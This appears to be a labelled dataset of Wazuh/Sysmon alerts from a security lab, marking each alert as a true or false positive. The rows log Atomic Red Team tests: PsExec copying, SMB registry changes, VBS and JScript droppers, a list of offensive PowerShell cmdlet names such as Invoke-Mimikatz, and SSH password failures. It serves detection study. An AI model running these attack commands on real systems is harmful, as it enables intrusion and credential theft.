ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"A net.exe account discovery command was initiated 3 Low A net.exe account discovery command was initiated 92039 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\net1 user guest net user guest C:\\Windows\\SysWOW64\\net1.exe C:\\Windows\\SysWOW64\\net.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2025-07-06 11:40:53.452
ProcessGuid: {ff3427f9-60c5-686a-2804-000000001600}
ProcessId: 7668
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.26100.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\WINDOWS\system32\net1 user guest
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {ff3427f9-51d6-686a-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=669EE7F92EA3872FE2A36DF91ABF0E049B829279,MD5=F8D42E2BF18D54816819EA4DB4480F5F,SHA256=647136C32E9E7639B251719CFE503F1BD482335AECEC7AE7CB8A91B0A9805D49,IMPHASH=FEB4A1A72B6368863C8CC53955256BF8
ParentProcessGuid: {ff3427f9-60c5-686a-2604-000000001600}
ParentProcessId: 7896
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net user guest
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Command shell started script with /c modifier 4 Low Command shell started script with /c modifier 92005 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\WINDOWS\\System32\\WScript.exe\"" \""C:\\Users\\snell\\AppData\\Local\\Temp\\AtomicTest.vbs\"" \""cmd.exe\"" /c c:\\windows\\system32\\cmd.exe /c cd /d %TEMP%\\ &amp; echo Set objShell = CreateObject(\""WScript.Shell\""):Set objExec = objShell.Exec(\""whoami\""):Set objExec = Nothing:Set objShell = Nothing &gt; AtomicTest.vbs &amp; AtomicTest.vbs C:\\Windows\\System32\\wscript.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 19:08:55.941
ProcessGuid: {ff3427f9-26c7-6868-1802-000000001400}
ProcessId: 5208
Image: C:\Windows\System32\wscript.exe
FileVersion: 5.812.10240.16384
Description: Microsoft ® Windows Based Script Host
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
OriginalFileName: wscript.exe
CommandLine: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\snell\AppData\Local\Temp\AtomicTest.vbs"" 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=F17CFCD2BDA29421AD37F8764C514396A1DEA7C9,MD5=60933788CB36C3EE2199626C5EC8ADA0,SHA256=7D31A31136319D0A277C7FB0E9BBCB46BA3535A42AEB0307FED70F92649F4162,IMPHASH=EE6DDCBA60642B0ADD3CAB9EA721BEE2
ParentProcessGuid: {ff3427f9-26c7-6868-1402-000000001400}
ParentProcessId: 7940
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Scripting file created under Windows Temp or User folder 6 Low Scripting file created under Windows Temp or User folder 92200 sysmon sysmon_eid11_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\system32\\notepad.exe C:\\Users\\vboxuser\\Desktop\\mount_shares.bat SOCLAB\\vboxuser ""File created:
RuleName: -
UtcTime: 2025-07-04 16:17:52.294
ProcessGuid: {6a97c67b-fe8b-6867-6d02-000000000a00}
ProcessId: 3316
Image: C:\Windows\system32\notepad.exe
TargetFilename: C:\Users\vboxuser\Desktop\mount_shares.bat
CreationUtcTime: 2025-07-04 16:17:52.294
User: SOCLAB\vboxuser"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\system32\\cmd.exe /c C:\\Windows\\system32\\reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64 C:\\Windows\\system32\\cmd.exe /d /c C:\\Windows\\system32\\silcollector.cmd configure C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\cmd.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-03 08:07:35.579
ProcessGuid: {6a97c67b-3a47-6866-c500-000000000a00}
ProcessId: 3620
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6a97c67b-3a07-6866-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=DED8FD7F36417F66EB6ADA10E0C0D7C0022986E9,MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {6a97c67b-3a47-6866-c300-000000000a00}
ParentProcessId: 3560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /d /c C:\Windows\system32\silcollector.cmd configure
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Value added to registry key has Base64-like pattern 10 Medium Value added to registry key has Base64-like pattern 92041 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\WINDOWS\\system32\\reg.exe\"" add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f \""powershell.exe\"" &amp; {cmd.exe /c \\\""\""wmic \tcsproduct \tget UUID\\\""\""  cmd.exe /c \\\""\""fsutil behavior \tset SymlinkEvaluation R2L:1\\\""\""  cmd.exe /c \\\""\""fsutil behavior set \tSymlinkEvaluation R2R:1\\\""\"" reg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f       copy \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PsExec.exe\\\""\"" $env:temp cmd.exe /c \\\""\""$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \\\""\""--access-token\\\""\""\\\""\""} C:\\Windows\\System32\\reg.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1112,technique_name=Modify Registry
UtcTime: 2025-07-04 20:40:46.584
ProcessGuid: {ff3427f9-3c4e-6868-db03-000000001400}
ProcessId: 3396
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: ""C:\WINDOWS\system32\reg.exe"" add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=0B0C075EAEA780D3A1649169D3B7D9AB698AEA03,MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771
ParentProcessGuid: {ff3427f9-3c4d-6868-d403-000000001400}
ParentProcessId: 7260
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {cmd.exe /c \""""wmic 	csproduct 	get UUID\"""" 
cmd.exe /c \""""fsutil behavior 	set SymlinkEvaluation R2L:1\"""" 
cmd.exe /c \""""fsutil behavior set 	SymlinkEvaluation R2R:1\""""
reg    add    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      
copy \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe\"""" $env:temp
cmd.exe /c \""""$env:temp\psexec.exe  -accepteula  \\$ENV:COMPUTERNAME cmd.exe  /c echo \""""--access-token\""""\""""}
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Process loaded taskschd.dll module. May be used to create delayed malware execution 4 Low Process loaded taskschd.dll module. May be used to create delayed malware execution 92154 sysmon sysmon_eid7_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\sppsvc.exe NT AUTHORITY\\NETWORK SERVICE ""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2025-07-03 11:01:48.302
ProcessGuid: {ff3427f9-62fb-6866-cd02-000000001200}
ProcessId: 6964
Image: C:\Windows\System32\sppsvc.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=A4B08104B05CBD92D218FF4B9D920631A309405A,MD5=FBBE5FDD089674EECBCE5F95C2D8CB31,SHA256=472971A0163D10867DE865FC0B39282753A760FB78218BE3345EDA253A7302DD,IMPHASH=E61FD409CB21E6A6EBA2AFE59848CFC8
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\NETWORK SERVICE"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\tmca\\ImagePath binary is: %%systemroot%%\\VInRVbCa.exe 3 Low Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\tmca\\ImagePath binary is: %%systemroot%%\\VInRVbCa.exe 92307 sysmon sysmon_eid13_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\system32\\services.exe NT AUTHORITY\\SYSTEM ""Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2025-07-08 19:58:50.328
ProcessGuid: {6a97c67b-772a-686d-0b00-000000000e00}
ProcessId: 596
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\tmca\ImagePath
Details: %%systemroot%%\VInRVbCa.exe
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\pscp.exe  -P 22 -pw atomic C:\\Temp\\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip \""cmd.exe\"" /c fsutil file createnew C:\\Temp\\T1105_scp.zip 1048576 &amp; echo y | C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\pscp.exe -P 22 -pw atomic C:\\Temp\\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip C:\\AtomicRedTeam\\ExternalPayloads\\pscp.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:51:14.480
ProcessGuid: {ff3427f9-4cd2-6868-5406-000000001400}
ProcessId: 4912
Image: C:\AtomicRedTeam\ExternalPayloads\pscp.exe
FileVersion: Release 0.83
Description: Command-line SCP/SFTP client
Product: PuTTY suite
Company: Simon Tatham
OriginalFileName: PSCP
CommandLine: C:\AtomicRedTeam\atomics\..\ExternalPayloads\pscp.exe  -P 22 -pw atomic C:\Temp\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=5BBAE525DA8F721E0BB525226D5463D594CC6187,MD5=B76478C1A7CFD6E8DD82B4BEC2C9B668,SHA256=5AA48B142333BC7D097AED9A75284BD66B325C26558C8B9B6F37C276F3A5173A,IMPHASH=2247B91E1D45B84EB01026F0A6E3319D
ParentProcessGuid: {ff3427f9-4cd1-6868-5006-000000001400}
ParentProcessId: 3404
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c fsutil file createnew C:\Temp\T1105_scp.zip 1048576 & echo y | C:\AtomicRedTeam\atomics\..\ExternalPayloads\pscp.exe -P 22 -pw atomic C:\Temp\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Possible DLL search order hijack by C:\\Windows\\SoftwareDistribution\\Download\\d334d481a47cb98edae87007427d1718\\Metadata\\WinREAgent.dll created in Windows root folder 6 Low Possible DLL search order hijack by C:\\Windows\\SoftwareDistribution\\Download\\d334d481a47cb98edae87007427d1718\\Metadata\\WinREAgent.dll created in Windows root folder 92219 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\System32\\svchost.exe C:\\Windows\\SoftwareDistribution\\Download\\d334d481a47cb98edae87007427d1718\\Metadata\\WinREAgent.dll NT AUTHORITY\\SYSTEM ""File created:
RuleName: technique_id=T1047,technique_name=File System Permissions Weakness
UtcTime: 2025-07-06 13:36:11.518
ProcessGuid: {ff3427f9-51d7-686a-1400-000000001600}
ProcessId: 1184
Image: C:\WINDOWS\System32\svchost.exe
TargetFilename: C:\Windows\SoftwareDistribution\Download\d334d481a47cb98edae87007427d1718\Metadata\WinREAgent.dll
CreationUtcTime: 2025-06-10 18:03:18.000
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c cscript \""C:\\AtomicRedTeam\\atomics\\T1059.007\\src\\sys_info.js\"" &gt; %%tmp%%\\T1059.007.out.txt \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:01:18.692
ProcessGuid: {ff3427f9-221e-6869-8301-000000001500}
ProcessId: 8424
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c cscript ""C:\AtomicRedTeam\atomics\T1059.007\src\sys_info.js"" > %%tmp%%\T1059.007.out.txt
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-20c8-6869-f800-000000001500}
ParentProcessId: 2440
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Powershell.exe spawned a powershell process which executed a base64 encoded command 12 High Powershell.exe spawned a powershell process which executed a base64 encoded command 92057 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {$malcmdlets = \\\""\""Add-Persistence\\\""\"", \\\""\""Find-AVSignature\\\""\"", \\\""\""Get-GPPAutologon\\\""\"", \\\""\""Get-GPPPassword\\\""\"", \\\""\""Get-HttpStatus\\\""\"", \\\""\""Get-Keystrokes\\\""\"", \\\""\""Get-SecurityPackages\\\""\"", \\\""\""Get-TimedScreenshot\\\""\"", \\\""\""Get-VaultCredential\\\""\"", \\\""\""Get-VolumeShadowCopy\\\""\"", \\\""\""Install-SSP\\\""\"", \\\""\""Invoke-CredentialInjection\\\""\"", \\\""\""Invoke-DllInjection\\\""\"", \\\""\""Invoke-Mimikatz\\\""\"", \\\""\""Invoke-NinjaCopy\\\""\"", \\\""\""Invoke-Portscan\\\""\"", \\\""\""Invoke-ReflectivePEInjection\\\""\"", \\\""\""Invoke-ReverseDnsLookup\\\""\"", \\\""\""Invoke-Shellcode\\\""\"", \\\""\""Invoke-TokenManipulation\\\""\"", \\\""\""Invoke-WmiCommand\\\""\"", \\\""\""Mount-VolumeShadowCopy\\\""\"", \\\""\""New-ElevatedPersistenceOption\\\""\"", \\\""\""New-UserPersistenceOption\\\""\"", \\\""\""New-VolumeShadowCopy\\\""\"", \\\""\""Out-CompressedDll\\\""\"", \\\""\""Out-EncodedCommand\\\""\"", \\\""\""Out-EncryptedScript\\\""\"", \\\""\""Out-Minidump\\\""\"", \\\""\""PowerUp\\\""\"", \\\""\""PowerView\\\""\"", \\\""\""Remove-Comments\\\""\"", \\\""\""Remove-VolumeShadowCopy\\\""\"", \\\""\""Set-CriticalProcess\\\""\"", \\\""\""Set-MasterBootRecord\\\""\""  foreach ($cmdlets in $malcmdlets) {     \\\""\""function $cmdlets { Write-Host Pretending to invoke $cmdlets }\\\""\""} foreach ($cmdlets in $malcmdlets) {     $cmdlets}} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 20:24:43.163
ProcessGuid: {ff3427f9-388b-6868-1a03-000000001400}
ProcessId: 2424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$malcmdlets = \""""Add-Persistence\"""", \""""Find-AVSignature\"""", \""""Get-GPPAutologon\"""", \""""Get-GPPPassword\"""", \""""Get-HttpStatus\"""", \""""Get-Keystrokes\"""", \""""Get-SecurityPackages\"""", \""""Get-TimedScreenshot\"""", \""""Get-VaultCredential\"""", \""""Get-VolumeShadowCopy\"""", \""""Install-SSP\"""", \""""Invoke-CredentialInjection\"""", \""""Invoke-DllInjection\"""", \""""Invoke-Mimikatz\"""", \""""Invoke-NinjaCopy\"""", \""""Invoke-Portscan\"""", \""""Invoke-ReflectivePEInjection\"""", \""""Invoke-ReverseDnsLookup\"""", \""""Invoke-Shellcode\"""", \""""Invoke-TokenManipulation\"""", \""""Invoke-WmiCommand\"""", \""""Mount-VolumeShadowCopy\"""", \""""New-ElevatedPersistenceOption\"""", \""""New-UserPersistenceOption\"""", \""""New-VolumeShadowCopy\"""", \""""Out-CompressedDll\"""", \""""Out-EncodedCommand\"""", \""""Out-EncryptedScript\"""", \""""Out-Minidump\"""", \""""PowerUp\"""", \""""PowerView\"""", \""""Remove-Comments\"""", \""""Remove-VolumeShadowCopy\"""", \""""Set-CriticalProcess\"""", \""""Set-MasterBootRecord\""""

foreach ($cmdlets in $malcmdlets) {
    \""""function $cmdlets { Write-Host Pretending to invoke $cmdlets }\""""}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
syslog: User missed the password more than one time 10 Medium syslog: User missed the password more than one time 2502 syslog access_control authentication_failed sshd Suricata Jul 07 20:30:46 Suricata sshd[2310]: PAM 4 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8 journald,1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel WinSrv2019 c:\\windows\\system32\\cmd.exe C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \""c:\\windows\\system32\\cmd.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\conhost.exe SOCLAB\\vboxuser ""Process Create:
